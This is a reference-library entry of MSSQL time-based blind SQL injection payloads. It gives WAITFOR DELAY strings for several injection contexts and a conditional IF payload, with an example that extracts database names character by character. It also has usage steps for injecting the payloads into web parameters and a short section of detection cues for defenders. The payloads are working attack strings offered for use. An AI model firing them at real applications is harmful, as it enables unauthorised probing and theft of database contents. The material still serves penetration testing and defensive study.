---
id: 4d115f63-11f9-4ca9-9fe4-801c14901aae
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:33.873024+00:00'
updated_at: '2023-04-10T20:22:45.330967+00:00'
tags:
  - sql-injection
  - time-based
  - mssql
  - payload
platforms:
  - Web
  - Windows
validated: true
---

# MSSQL-Time-Based-Delay-Payloads

## Code

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--

IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]' comment: --
```

## Description

This SQL code snippet provides variations of time-delay payloads for blind SQL injection in MSSQL databases. The first set tests different injection contexts (stacked queries, string closures) using WAITFOR DELAY to introduce a 10-second pause, confirming vulnerability. The IF-based payload enables conditional inference, delaying only if a data-extracting condition is true, allowing attackers to probe database contents via timing.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| [INFERENCE] | SQL condition to evaluate for truthiness (e.g., character existence or value check) | ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1))>64 |
| [SLEEPTIME] | Delay duration in 'HH:MM:SS' format for response timing | 0:0:5 |

## Usage

Inject these payloads into vulnerable web application parameters (e.g., via URL or POST data) during SQL injection testing. Start with basic delay tests to confirm execution, then use the conditional IF payload for data extraction in blind scenarios. Tools like Burp Suite or sqlmap can automate sending and timing requests. This is ideal for red team engagements targeting MSSQL-backed apps where error-based injection is blocked.

## Detection

- Monitor database query logs for WAITFOR DELAY usage or unusually long query execution times (>5 seconds).
- Web application logs showing repeated requests with SQL keywords or timing anomalies.
- WAF alerts on payloads containing 'WAITFOR', 'DELAY', or conditional SQL patterns.
- Network traffic analysis for HTTP requests with encoded SQL fragments.

## Related

- [[procedures/MSSQL-Time-Based-SQL-Injection]]
